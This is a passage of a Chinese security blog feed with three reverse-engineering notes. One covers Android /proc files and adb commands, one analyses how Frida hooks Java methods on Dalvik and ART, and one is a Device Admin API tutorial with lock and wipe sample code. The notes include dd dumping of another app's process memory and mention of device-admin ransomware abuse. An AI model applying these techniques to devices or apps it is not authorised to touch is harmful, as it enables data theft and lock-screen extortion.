vmallocinfo-r--r--r-- 1 root root 0 2018-08-07 11:45 vmstat-r--r--r-- 1 root root 0 2018-08-07 11:45 zoneinfo 某个进程下的文件（/proc/[pid]/）：123456789101112131415161718192021222324252627282930313233343536373839404142434445OnePlus5T:/proc/6537 # ls -ltotal 0dr-xr-xr-x 2 u0_a139 u0_a139 0 2018-08-06 12:08 attr-rw-r--r-- 1 root root 0 2018-08-07 11:50 autogroup-r-------- 1 root root 0 2018-08-07 11:50 auxv-r--r--r-- 1 root root 0 2018-08-07 11:50 cgroup--w------- 1 root root 0 2018-08-07 11:50 clear_refs-r--r--r-- 1 root root 0 2018-08-07 11:03 cmdline-rw-r--r-- 1 root root 0 2018-08-07 11:50 comm-rw-r--r-- 1 root root 0 2018-08-07 11:50 coredump_filter-r--r--r-- 1 root root 0 2018-08-07 11:50 cpusetlrwxrwxrwx 1 root root 0 2018-08-07 11:03 cwd -&gt; /-r-------- 1 root root 0 2018-08-07 11:50 environlrwxrwxrwx 1 root root 0 2018-08-07 11:03 exe -&gt; /system/bin/app_process32_xposeddr-x------ 2 root root 0 2018-08-07 11:03 fddr-x------ 2 root root 0 2018-08-07 11:03 fdinfo-r--r--r-- 1 root root 0 2018-08-07 11:50 limitsdr-x------ 2 root root 0 2018-08-07 11:50 map_files-r--r--r-- 1 root root 0 2018-08-07 11:03 maps-rw------- 1 root root 0 2018-08-07 11:50 mem-r--r--r-- 1 root root 0 2018-08-07 11:50 mountinfo-r--r--r-- 1 root root 0 2018-08-07 11:50 mounts-r-------- 1 root root 0 2018-08-07 11:50 mountstatsdr-xr-xr-x 10 u0_a139 u0_a139 0 2018-08-06 12:08 netdr-x--x--x 2 root root 0 2018-08-07 11:50 ns-r-------- 1 root root 0 2018-08-07 11:50 oom_adj-r--r--r-- 1 root root 0 2018-08-07 11:50 oom_score-r--r--r-- 1 root root 0 2018-08-06 12:11 oom_score_adj-r-------- 1 root root 0 2018-08-07 11:50 pagemap-r-------- 1 root root 0 2018-08-07 11:50 personalitylrwxrwxrwx 1 root root 0 2018-08-07 11:03 root -&gt; /-rw-rw-rw- 1 root root 0 2018-08-07 11:50 sched_group_id-rw-r--r-- 1 root root 0 2018-08-07 11:50 sched_init_task_load-rw-r--r-- 1 root root 0 2018-08-07 11:50 sched_wake_up_idle-r--r--r-- 1 root root 0 2018-08-07 11:50 schedstat-r--r--r-- 1 root root 0 2018-08-06 12:10 smaps-r-------- 1 root root 0 2018-08-07 11:50 stack-r--r--r-- 1 root root 0 2018-08-06 12:08 stat-r--r--r-- 1 root root 0 2018-08-07 11:50 statm-r--r--r-- 1 root root 0 2018-08-07 11:50 status-r-------- 1 root root 0 2018-08-07 11:50 syscalldr-xr-xr-x 155 u0_a139 u0_a139 0 2018-08-06 12:11 task-rw-rw-rw- 1 root root 0 2018-08-07 11:50 timerslack_ns-r--r--r-- 1 root root 0 2018-08-07 11:50 wakeup-r--r--r-- 1 root root 0 2018-08-07 11:03 wchan 研究中常用到的文件： /proc/pid/maps 文件、内存映射信息，配合dd使用/proc/6537/map_files/ 目录下保存maps中所有文件的软连接 /proc/pid/mem 文件io，配合dd使用,也可用open打开，例如： 1dd if=/proc/$pid/mem of=output_file ibs=1 offset=1234 /proc/pid/status 进程状态信息，可用于查看进程是否被调试 12345678910OnePlus5T:/proc/6537 # cat statusName: com.tencent.mmState: S (sleeping)Tgid: 6537Pid: 6537PPid: 883TracerPid: 0 (非零表示被调试)Uid: 10139 10139 10139 10139Gid: 10139 10139 10139 10139…… /proc/[pid]/cwd 当前工作目录的符号链接 /proc/[pid]/task 每个线程一个子目录，目录名为线程ID（付款码侧信道攻击） 参考：深入解析Linux proc文件系统 https://blog.csdn.net/ieearth/article/details/72849990 Monkeymonkey是android系统自带的一款测试工具例如启动com.tencent.mm应用，并随机发送500个事件1adb shell monkey -p com.tencent.mm -v 500 busyboxBusyBox 是一个集成了三百多个最常用Linux命令和工具的软件, Android中部分命令为linux的阉割版，像awk、wget这些命令，Android中都不提供，因此需要使用busybox完成下载地址：http://www.busybox.net/downloads/binaries 选择合适的架构即可 screencap和screenrecord截屏：adb shell screencap -p /sdcard/tmp.png录像：adb shell screenrecord /sdcard/demo.mp4 adb shell input adb shell input text “hello,world” 获得焦点后输入文字 adb shell keyevent [–longpress] 按键例如：adb shell keyevent 26 或 input keyevent “KEYCODE_POWER” 两个都可以锁屏所有的keycode参考：https://developer.android.com/reference/android/view/KeyEvent.html adb shell tap 点击屏幕例如：adb shell input tap 50 250 点击x=50 y=250的位置 adb shell swipe [duration(ms)] 滑动屏幕例如：adb shell input swipe 50 250 250 250 500 最后一位为滑动时间 adb logcat ”-s”选项 : 设置输出日志的标签, 只显示该标签的日志;例如：adb logcat -s System.out ”-f”选项 : 将日志输出到文件, -f 参数执行不成功 默认输出到标准输出流中;例如：adb logcat -f /tmp/log.txt ”-c”选项 : 清空所有的日志缓存信息; “-e”选项 ：正则匹配例如：logcat -e “.*wifi” “–pid=” ：根据pid筛选log例如： adb logcat –pid=1234 配合grep例如： adb logcat | grep -i Wifi [:priority] tag为标签或,priority为以下几种：– V : Verbose (明细);– D : Debug (调试);– I : Info (信息);– W : Warn (警告);– E : Error (错误);– F: Fatal (严重错误);– S : Silent(Super all output) (最高的优先级, 可能不会记载东西);例如： “adb logcat :E” 输出所有的Error日志 am命令 am startam start -n 包名/activity -d dataam start -n 包名/activity -e extra (–es –ei )am start -a android.intent.action.VIEW -d http://www.google.cn/ am startserviceam startservice -n 包名/服务名 am broadcastam broadcast -a com.android.test (–es test_string “this is test string” –ei test_int 100 –ez test_boolean true) netstat查看设备的端口号信息，（warmwhole检测）-r Display routing table.-a Display all sockets (Default: Connected).-l Display listening server sockets.-t Display TCP sockets.-u Display UDP sockets.-w Display Raw sockets.-x Display Unix sockets.-e Display other/more information.-n Don’t resolve names.-p Display PID/Program name for sockets. 例如：netstat -lp 显示所有监听的socket以及对应的pid getprop和setprop getprop默认获得所有的参数，常用参数如下：getprop ro.debuggablegetprop ro.build.productgetprop ro.build.fingerprintgetprop ro.serialno setprop [key] [value],有些需要特殊权限 service service list 列出所有的服务 service call 调用服务用法：service call CODE [i32 N | i64 N | f N | d N | s16 STR ]例如：service call phone 1 s16 “10086” 打电话]]></content>
  </entry>
  <entry>
    <title><![CDATA[Frida源码分析]]></title>
    <url>%2F2018%2F07%2F31%2FMac%E4%B8%8A%E7%BC%96%E8%AF%91Frida%2F</url>
    <content type="text"><![CDATA[frida代码结构：frida-core: Frida core library intended for static linking into bindingsfrida-gum: Low-level code instrumentation library used by frida-corebindings:frida-python: Frida Python bindingsfrida-node: Frida Node.js bindingsfrida-qml: Frida Qml pluginfrida-swift: Frida Swift bindingsfrida-tools: Frida CLI toolscapstone: instruction disammbler frida-gum解析：frida-gum 本身就是一种跨平台的设计. 有两个点需要处理统一: 1. 针对 CPU 架构的代码 2. 针对操作系统(Backend) 的代码. 同时要在这两个点上构建 CPU/OS 无关代码, 以及规定一些统一的接口. frida-gum/gum/arch-* 定义的是与 CPU 架构有关的代码,也就是汇编级操作, 比如汇编指令的读/写/修复. frida-gum/gum/backend-* 分两种情况: 1. 定义的是与操作系统有关的代码, 更多是一些内存/进程等操作 2. 对 arch 层级代码的封装成统一逻辑 frida-gum/* 对 arch 和 backend 的抽象封装成上层的平台/架构无关代码. frida-gum/bindings/gumjs/：分V8和Duktape两个引擎，实现了Module、Memory、NativeFunction等功能（https://www.frida.re/docs/javascript-api/） 两种模式 attach模式attach到已经存在的进程，核心原理是ptrace修改进程内存，如果进程处于调试状态（traceid不等于0），则attach失败 spawn模式启动一个新的进程并挂起，在启动的同时注入frida代码，适用于在进程启动前的一些hook，如hook RegisterNative等，注入完成后调用resume恢复进程。 frida-java解析源码结构 index.js:vm VM虚拟机的wrapperclassFactory class的wrapperavailable 逻辑变量,指明当前的进程是否载入了虚拟机androidVersion 当前版本号enumerateLoadedClasses 枚举所有加载的类enumerateLoadedClassesSync 上面那个API的同步版本， 载入完毕才将所有的类作为一个数组返回enumerateClassLoaders Android N以上的支持enumerateClassLoadersSync 同上 classFactory.js:use: 找到类implementation: 实现一个函数overloads:$new $alloc $init vm.js:getEnvperformattachCurrentThreadDetachCurrentThread android.js/global Memory, Module, NativeCallback, NativeFunction, NULL, Process/getApiensureClassInitializedgetAndroidVersiongetAndroidApiLevelgetArtMethodSpecgetArtThreadSpecgetArtThreadFromEnvwithRunnableArtThreadwithAllArtThreadsSuspendedmakeArtClassVisitormakeArtClassLoaderVisitorcloneArtMethod env.jsJNIEnv的wrapper Hook分析 implementation 区分了ART实现和Dalvik实现 Dalvik hook实现frida兼容了低版本的Android, 低于Android 5.0时，采用Dalvik虚拟机，其核心实现在replaceDalvikImplementation函数中。 frida的Dalvik hook和xposed的hook原理相同，都是把要hook的java函数变成native函数，并修改函数的入口为自定义的内容，这样在调用时就会执行自定义的代码。 首先我们看一下Dalvik虚拟机执行java函数过程： 第4步dvmCallMethodV会根据accessFlags决定调用native还是java函数，因此修改accessFlags后，Dalvik会认为这个函数是一个native函数，便走向了native分支。 Java层的每一个函数在Dalvik中都对应一个Method数据结构，在源代码中定义如下：1234567891011121314151617181920212223242526272829303132333435363738394041//https://android.googlesource.com/platform/dalvik/+/6d874d2bda563ada1034d2b3219b35d800fc6860/vm/oo/Object.h#418struct Method &#123; ClassObject* clazz; /* method所属的类 public、native等*/ u4 accessFlags; /* 访问标记 */ u2 methodIndex; //method索引 //三个size为边界值，对于native函数，这3个size均等于参数列表的size u2 registersSize; /* ins + locals */ u2 outsSize; u2 insSize; const char* name;//函数名称 /* * Method prototype descriptor string (return and argument types) */ DexProto prototype; /* short-form method descriptor string */ const char* shorty; /* * The remaining items are not used for abstract or native methods. * (JNI is currently hijacking &quot;insns&quot; as a function pointer, set * after the first call. For internal-native this stays null.) */ /* the actual code */ const u2* insns; /* instructions, in memory-mapped .dex */ /* cached JNI argument and return-type hints */ int jniArgInfo; /* * Native method ptr; could be actual function or a JNI bridge. We * don&apos;t currently discriminate between DalvikBridgeFunc and * DalvikNativeFunc; the former takes an argument superset (i.e. two * extra args) which will be ignored. If necessary we can use * insns==NULL to detect JNI bridge vs. internal native. */ DalvikBridgeFunc nativeFunc; /* * Register map data, if available. This will point into the DEX file * if the data was computed during pre-verification, or into the * linear alloc area if not. */ const RegisterMap* registerMap;&#125;; replaceDalvikImplementation修改了method中的accessFlags、registersSize、outsSize、insSize和jniArgInfo，将原java函数对应的结构体修改为一个native函数，并调用dvmUseJNIBridge（dvmUseJNIBridge实现代码）为这个Method设置一个Bridge，改变结构体中的nativeFunc，指向自定义的函数。1234567891011121314151617181920212223242526272829303132333435363738394041424344function replaceDalvikImplementation (fn) &#123; if (fn === null &amp;&amp; dalvikOriginalMethod === null) &#123; return; &#125;//备份原来的method, if (dalvikOriginalMethod === null) &#123; dalvikOriginalMethod = Memory.dup(methodId, DVM_METHOD_SIZE); dalvikTargetMethodId = Memory.dup(methodId, DVM_METHOD_SIZE); &#125; if (fn !== null) &#123; //自定的代码 implementation = implement(f, fn); let argsSize = argTypes.reduce((acc, t) =&gt; (acc + t.size), 0); if (type === INSTANCE_METHOD) &#123; argsSize++; &#125; // 把method变成native函数 /* * make method native (with kAccNative) * insSize and registersSize are set to arguments size */ const accessFlags = (Memory.readU32(methodId.add(DVM_METHOD_OFFSET_ACCESS_FLAGS)) | kAccNative) &gt;&gt;&gt; 0; const registersSize = argsSize; const outsSize = 0; const insSize = argsSize; Memory.writeU32(methodId.add(DVM_METHOD_OFFSET_ACCESS_FLAGS), accessFlags); Memory.writeU16(methodId.add(DVM_METHOD_OFFSET_REGISTERS_SIZE), registersSize); Memory.writeU16(methodId.add(DVM_METHOD_OFFSET_OUTS_SIZE), outsSize); Memory.writeU16(methodId.add(DVM_METHOD_OFFSET_INS_SIZE), insSize); Memory.writeU32(methodId.add(DVM_METHOD_OFFSET_JNI_ARG_INFO), computeDalvikJniArgInfo(methodId)); //调用dvmUseJNIBridge为这个Method设置一个Bridge,本质上是修改结构体中的nativeFunc为自定义的implementation函数 api.dvmUseJNIBridge(methodId, implementation); patchedMethods.add(f); &#125; else &#123; patchedMethods.delete(f); Memory.copy(methodId, dalvikOriginalMethod, DVM_METHOD_SIZE); implementation = null; &#125;&#125; 自定义的js代码如何生成？implement的实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124function implement (method, fn) &#123; if (method.hasOwnProperty(&apos;overloads&apos;)) &#123; throw new Error(&apos;Only re-implementing a concrete (specific) method is possible, not a method &quot;dispatcher&quot;&apos;); &#125; const C = method.holder; // eslint-disable-line const type = method.type; const retType = method.returnType; const argTypes = method.argumentTypes; const methodName = method.methodName; const rawRetType = retType.type; const rawArgTypes = argTypes.map((t) =&gt; (t.type)); const pendingCalls = method[PENDING_CALLS]; // eslint-disable-line let frameCapacity = 2; const argVariableNames = argTypes.map((t, i) =&gt; (&apos;a&apos; + (i + 1))); const callArgs = argTypes.map((t, i) =&gt; &#123; if (t.fromJni) &#123; frameCapacity++; return [&apos;argTypes[&apos;, i, &apos;].fromJni.call(self, &apos;, argVariableNames[i], &apos;, env)&apos;].join(&apos;&apos;); &#125; else &#123; return argVariableNames[i]; &#125; &#125;); let returnCapture, returnStatements, returnNothing; if (rawRetType === &apos;void&apos;) &#123; returnCapture = &apos;&apos;; returnStatements = &apos;env.popLocalFrame(NULL);&apos;; returnNothing = &apos;return;&apos;; &#125; else &#123; if (retType.toJni) &#123; frameCapacity++; returnCapture = &apos;result = &apos;; returnStatements = &apos;var rawResult;&apos; + &apos;try &#123;&apos; + &apos;if (retType.isCompatible.call(this, result)) &#123;&apos; + &apos;rawResult = retType.toJni.call(this, result, env);&apos; + &apos;&#125; else &#123;&apos; + &apos;throw new Error(&quot;Implementation for &quot; + methodName + &quot; expected return value compatible with \&apos;&quot; + retType.className + &quot;\&apos;.&quot;);&apos; + &apos;&#125;&apos;; if (retType.type === &apos;pointer&apos;) &#123; returnStatements += &apos;&#125; catch (e) &#123;&apos; + &apos;env.popLocalFrame(NULL);&apos; + &apos;throw e;&apos; + &apos;&#125;&apos; + &apos;return env.popLocalFrame(rawResult);&apos;; returnNothing = &apos;return NULL;&apos;; &#125; else &#123; returnStatements += &apos;&#125; finally &#123;&apos; + &apos;env.popLocalFrame(NULL);&apos; + &apos;&#125;&apos; + &apos;return rawResult;&apos;; returnNothing = &apos;return 0;&apos;; &#125; &#125; else &#123; returnCapture = &apos;result = &apos;; returnStatements = &apos;env.popLocalFrame(NULL);&apos; + &apos;return result;&apos;; returnNothing = &apos;return 0;&apos;; &#125; &#125; let f; eval(&apos;f = function (&apos; + [&apos;envHandle&apos;, &apos;thisHandle&apos;].concat(argVariableNames).join(&apos;, &apos;) + &apos;) &#123;&apos; + // eslint-disable-line &apos;var env = new Env(envHandle, vm);&apos; + &apos;if (env.pushLocalFrame(&apos; + frameCapacity + &apos;) !== JNI_OK) &#123;&apos; + &apos;return;&apos; + &apos;&#125;&apos; + &apos;var self = &apos; + ((type === INSTANCE_METHOD) ? &apos;new C(thisHandle);&apos; : &apos;new C(null);&apos;) + &apos;var result;&apos; + &apos;var tid = Process.getCurrentThreadId();&apos; + &apos;try &#123;&apos; + &apos;pendingCalls.add(tid);&apos; + &apos;if (ignoredThreads[tid] === undefined) &#123;&apos; + returnCapture + &apos;fn.call(&apos; + [&apos;self&apos;].concat(callArgs).join(&apos;, &apos;) + &apos;);&apos; + &apos;&#125; else &#123;&apos; + returnCapture + &apos;method.call(&apos; + [&apos;self&apos;].concat(callArgs).join(&apos;, &apos;) + &apos;);&apos; + &apos;&#125;&apos; + &apos;&#125; catch (e) &#123;&apos; + &apos;env.popLocalFrame(NULL);&apos; + &quot;if (typeof e === &apos;object&apos; &amp;&amp; e.hasOwnProperty(&apos;$handle&apos;)) &#123;&quot; + &apos;env.throw(e.$handle);&apos; + returnNothing + &apos;&#125; else &#123;&apos; + &apos;throw e;&apos; + &apos;&#125;&apos; + &apos;&#125; finally &#123;&apos; + &apos;pendingCalls.delete(tid);&apos; + &apos;&#125;&apos; + returnStatements + &apos;&#125;;&apos;); Object.defineProperty(f, &apos;methodName&apos;, &#123; enumerable: true, value: methodName &#125;); Object.defineProperty(f, &apos;type&apos;, &#123; enumerable: true, value: type &#125;); Object.defineProperty(f, &apos;returnType&apos;, &#123; enumerable: true, value: retType &#125;); Object.defineProperty(f, &apos;argumentTypes&apos;, &#123; enumerable: true, value: argTypes &#125;); Object.defineProperty(f, &apos;canInvokeWith&apos;, &#123; enumerable: true, value: function (args) &#123; if (args.length !== argTypes.length) &#123; return false; &#125; return argTypes.every((t, i) =&gt; (t.isCompatible(args[i]))); &#125; &#125;); return new NativeCallback(f, rawRetType, [&apos;pointer&apos;, &apos;pointer&apos;].concat(rawArgTypes));&#125; 在自定义的代码里调用原函数？ ART hook实现frida的ART hook实现也是把java method转为native method, 但ART的运行机制不同于Dalvik, 其实现也较为复杂，这里从ART运行机制开始解释。 ART 是一种代替 Dalivk 的新的运行时,它具有更高的执行效率。ART虚拟机执行 Java 方法主要有两种模式：quick code 模式和 Interpreter 模式。 quick code 模式：执行 arm 汇编指令 Interpreter 模式：由解释器解释执行 Dalvik 字节码 即使是在quick code模式中，也有类方法可能需要以Interpreter模式执行。反之亦然。解释执行的类方法通过函数artInterpreterToCompiledCodeBridge的返回值调用本地机器指令执行的类方法；本地机器指令执行的类方法通过函数GetQuickToInterpreterBridge的返回值调用解释执行的类方法； ART中的每一个函数都对应一个ARTMethod结构体，其中entry_point_frominterpreter和entry_point_from_quick_compiledcode分别表示两种模式的调用入口ARTMethod结构如下:1234567891011121314151617181920212223242526272829303132333435363738394041424344//http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method.h#708class ArtMethod &#123; GcRoot&lt;mirror::Class&gt; declaring_class_; //method所属的class // Short cuts to declaring_class_-&gt;dex_cache_ member for fast compiled code access. GcRoot&lt;mirror::PointerArray&gt; dex_cache_resolved_methods_; // Short cuts to declaring_class_-&gt;dex_cache_ member for fast compiled code access. GcRoot&lt;mirror::ObjectArray&lt;mirror::Class&gt;&gt; dex_cache_resolved_types_; // Access flags; low 16 bits are defined by spec. uint32_t access_flags_; /* Dex file fields. The defining dex file is available via declaring_class_-&gt;dex_cache_ */ // Offset to the CodeItem. uint32_t dex_code_item_offset_; // Index into method_ids of the dex file associated with this method. uint32_t dex_method_index_; /* End of dex file fields. */ // Entry within a dispatch table for this method. For static/direct methods the index is into // the declaringClass.directMethods, for virtual methods the vtable and for interface methods the // ifTable. uint32_t method_index_; // Fake padding field gets inserted here. // Must be the last fields in the method. // PACKED(4) is necessary for the correctness of // RoundUp(OFFSETOF_MEMBER(ArtMethod, ptr_sized_fields_), pointer_size). struct PACKED(4) PtrSizedFields &#123; // Method dispatch from the interpreter invokes this pointer which may cause a bridge into // 以interpreter模式调用入口 void* entry_point_from_interpreter_; void* entry_point_from_jni_; //jni函数入口 // 以quick code调用时的函数入口 void* entry_point_from_quick_compiled_code_; &#125; ptr_sized_fields_;&#125; ART的执行流程如下图： 如图所示，对于一个native method, ART虚拟机首先会尝试quickcode模式执行，检查ARTMethod结构中的entry_point_from_quick_compiledcode成员，这里分3种情况： 如果函数已经存在quick code, 则指向这个函数对应的 quick code的起始地址，而当quick code不存在时，它的值则会代表其他的意义； 当一个 java 函数不存在 quick code时，它的值是函数 artQuickToInterpreterBridge 的地址，用以从 quick 模式切换到 Interpreter 模式来解释执行 java 函数代码； 当一个 java native（JNI）函数不存在 quick code时，它的值是函数 art_quick_generic_jni_trampoline 的地址，用以执行没有quick code的 jni 函数； 因此，如果frida把一个java method改为jni method, 显然是不存在quick code，这时需要将entry_point_from_quick_compiledcode值修改为art_quick_generic_jni_trampoline 的地址。 art_quick_generic_jni_trampoline函数实现比较复杂（代码分析)，主要负责jni调用的准备，包括堆栈的设置，参数的设置等,该函数最终会调到entry_point_fromjni，即jni函数的入口。 因此，frida把java method改为jni method，需要修改ARTMethod结构体中的这几个值：accessflags = nativeentry_point_fromjni = 自定义代码的入口entry_point_from_quick_compiledcode = art_quick_generic_jni_trampoline函数的地址entry_point_frominterpreter = artInterpreterToCompiledCodeBridge函数地址 frida对ARTMethod的修改在replaceArtImplementation函数中：12345678910patchMethod(methodId, &#123; //jnicode入口entry_point_from_jni_改为自定义的代码 &apos;jniCode&apos;: implementation, //修改为access_flags_为native &apos;accessFlags&apos;: (Memory.readU32(methodId.add(artMethodOffset.accessFlags)) | kAccNative | kAccFastNative) &gt;&gt;&gt; 0, //entry_point_from_quick_compiled_code_ &apos;quickCode&apos;: api.artQuickGenericJniTrampoline, //entry_point_from_interpreter_ &apos;interpreterCode&apos;: api.artInterpreterToCompiledCodeBridge&#125;); patchMethod实现：12345678910111213function patchMethod (methodId, patches) &#123; const artMethodSpec = getArtMethodSpec(vm); const artMethodOffset = artMethodSpec.offset; Object.keys(patches).forEach(name =&gt; &#123; const offset = artMethodOffset[name]; if (offset === undefined) &#123; return; &#125; const address = methodId.add(offset); const suffix = (name === &apos;accessFlags&apos; ? &apos;U32&apos; : &apos;Pointer&apos;); Memory[&apos;write&apos; + suffix](address, patches[name]); &#125;);&#125; getArtMethodSpec实现：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566function _getArtMethodSpec (vm) &#123; const api = getApi(); let spec; vm.perform(() =&gt; &#123; const env = vm.getEnv(); const process = env.findClass(&apos;android/os/Process&apos;); const setArgV0 = env.getStaticMethodId(process, &apos;setArgV0&apos;, &apos;(Ljava/lang/String;)V&apos;); const runtimeModule = Process.getModuleByName(&apos;libandroid_runtime.so&apos;); const runtimeStart = runtimeModule.base; const runtimeEnd = runtimeStart.add(runtimeModule.size); const apiLevel = getAndroidApiLevel(); const entrypointFieldSize = (apiLevel &lt;= 21) ? 8 : pointerSize; const expectedAccessFlags = kAccPublic | kAccStatic | kAccFinal | kAccNative; let jniCodeOffset = null; let accessFlagsOffset = null; let remaining = 2; for (let offset = 0; offset !== 64 &amp;&amp; remaining !== 0; offset += 4) &#123; const field = setArgV0.add(offset); if (jniCodeOffset === null) &#123; const address = Memory.readPointer(field); if (address.compare(runtimeStart) &gt;= 0 &amp;&amp; address.compare(runtimeEnd) &lt; 0) &#123; jniCodeOffset = offset; remaining--; &#125; &#125; if (accessFlagsOffset === null) &#123; const flags = Memory.readU32(field); if (flags === expectedAccessFlags) &#123; accessFlagsOffset = offset; remaining--; &#125; &#125; &#125; if (remaining !== 0) &#123; throw new Error(&apos;Unable to determine ArtMethod field offsets&apos;); &#125; const quickCodeOffset = jniCodeOffset + entrypointFieldSize; const size = (apiLevel &lt;= 21) ? (quickCodeOffset + 32) : (quickCodeOffset + pointerSize); spec = &#123; size: size, offset: &#123; jniCode: jniCodeOffset, quickCode: quickCodeOffset, accessFlags: accessFlagsOffset &#125; &#125;; if (&apos;artInterpreterToCompiledCodeBridge&apos; in api) &#123; spec.offset.interpreterCode = jniCodeOffset - entrypointFieldSize; &#125; &#125;); return spec;&#125; 参考： https://bbs.pediy.com/thread-229215.htm 基于Frida的全平台逆向分析 Xposed框架原理深入研究 art_quick_generic_jni_trampoline分析 [ART Method Execution]（https://blog.csdn.net/hl09083253cy/article/details/78418702） [ART执行类方法解析流程]（https://blog.csdn.net/zhu929033262/article/details/75093012） https://github.com/TinyNiko/TinyNiko.github.io/blob/master/Frida.pdf Creating a Java VM from Android Native Code https://calebfenton.github.io/2017/04/05/creating_java_vm_from_android_native_code/ mac下编译frida git clone https://github.com/frida/frida 创建代码签名证书frida-cert参考https://sourceware.org/gdb/wiki/BuildingOnDarwin中的2.1.1. Create a certificate部分，将gdb-cert替换为frida-cert即可 make 采坑记录： ANDROID_NDK_ROOT must be set to the location of your r15c NDK.解决办法:设置环境变量ANDROID_NDK_ROOT为ndk_r15c，必须为r15版本，我只是在当前shell里export ANDROID_NDK_ROOT=/home/xxx/ndk-path时无法编译通过，设为系统环境变量时，编译才通过。 Dependency ‘glib-2.0’ not found12meson.build:123:0: ERROR: Dependency &apos;glib-2.0&apos; not found, tried Extra Frameworks and Pkg-Config:&apos;utf-8&apos; codec can&apos;t decode byte 0xe5 in position 16: invalid continuation byte 实际运行pkg-config –modversion glib-2.0时，发现glib-2.0是存在的，出现以上错误是因为路径中包含中文！！！ AttributeError: module ‘enum’ has no attribute ‘IntFlag’解决办法: 设置PYTHONPATH为python3.6的路径,export PYTHONPATH=/usr/bin/python3.6]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android设备管理器]]></title>
    <url>%2F2018%2F07%2F26%2FAndroid%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86%E5%99%A8%2F</url>
    <content type="text"><![CDATA[一、简介Android 提供了一个可管理和操作设备的API叫DevicePolicyManager，使用这个API可以接管手机的应用权限，对手机做出很重要很多大胆的操作,比如设置锁屏方式、恢复出厂设置、设置密码、强制清除密码，修改密码等操作。 很多“远程查找手机”的实现使用了设备管理器功能，可以实现远程锁定手机，远程擦除，远程响铃等。 此外，很多恶意软件通过设备管理器进行“锁屏勒索”等恶意操作，为了限制设备管理器被滥用，Android N 规定，第三方应用开发者只能使用DevicePolicyManager.resetPassword为无密码设备设置初始密码，而不能重置或清除已有的设备密码，但在Android N以下还是存在该类型的勒索攻击。 由于设备管理器的高权限，因此要谨慎对待申请激活设备管理器的App，例如：今日头条、某些安全管家等等， 二、设备管理器使用 Menifest文件中注册receiver 123456789101112&lt;receiver android:name=&quot;.demo.DeviceReceiver&quot; android:permission=&quot;android.permission.BIND_DEVICE_ADMIN&quot;&gt; &lt;meta-data android:name=&quot;android.app.device_admin&quot; android:resource=&quot;@xml/device_admin&quot; /&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.app.action.DEVICE_ADMIN_ENABLED&quot; /&gt; &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt; &lt;category android:name=&quot;android.intent.category.HOME&quot; /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; 创建xml文件夹添加device_admin.xml 12345678910111213141516&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;device-admin xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt; &lt;uses-policies&gt; &lt;limit-password /&gt; &lt;!-- 限制密码类型 --&gt; &lt;watch-login /&gt; &lt;!-- 监控登录尝试 --&gt; &lt;reset-password /&gt; &lt;!-- 重置密码 --&gt; &lt;force-lock /&gt; &lt;!--锁屏 --&gt; &lt;wipe-data /&gt; &lt;!-- 恢复出厂设置 --&gt; &lt;/uses-policies&gt;&lt;/device-admin&gt; 新建一个class继承DeviceAdminReceiver 123import android.app.admin.DeviceAdminReceiver;public class MyAdmin extends DeviceAdminReceiver &#123;&#125; 实现代码 1234567891011121314151617181920212223242526272829303132333435363738394041public class MainActivity extends AppCompatActivity &#123; private DevicePolicyManager dpm; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE); //openAdmin(); Button bt = (Button)findViewById(R.id.button); bt.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View view) &#123; ComponentName cn = new ComponentName(getApplication(), MyAdmin.class); if(dpm.isAdminActive(cn))&#123; //设备管理员的api dpm.lockNow(); //锁屏 //dpm.wipeData(0); //擦除数据,谨慎使用 //dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);//删除sdcard数据 &#125;else&#123; openAdmin(); Toast.makeText(getApplicationContext(), &quot;请先激活管理员&quot;, 0).show(); &#125; &#125; &#125;); &#125; //激活设备管理器 public void openAdmin()&#123; //进入设备管理器激活向导 Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN); ComponentName cn = new ComponentName(this, MyAdmin.class); intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn); //提示用户开启管理员 intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, &quot;请激活设备管理器&quot;); startActivityForResult(intent,0); &#125;&#125; 三、设备管理器相关漏洞 隐藏设备管理器中的列表当用户激活设备管理器后，程序会在setting设备管理器列表隐藏，应用程序激活成设备管理器后，可以实现锁屏、擦除用户数据等功能，并且无法使用常规的卸载方式对其卸载参考：https://bbs.pediy.com/thread-183692.htmhttp://seclab.safe.baidu.com/2014-10/deviceadminexploit2.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android FRP功能分析（Factory Reset Protection）]]></title>
    <url>%2F2018%2F07%2F25%2FAndroid-FRP%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90%EF%BC%88Factory-Reset-Protection%EF%BC%89%2F</url>
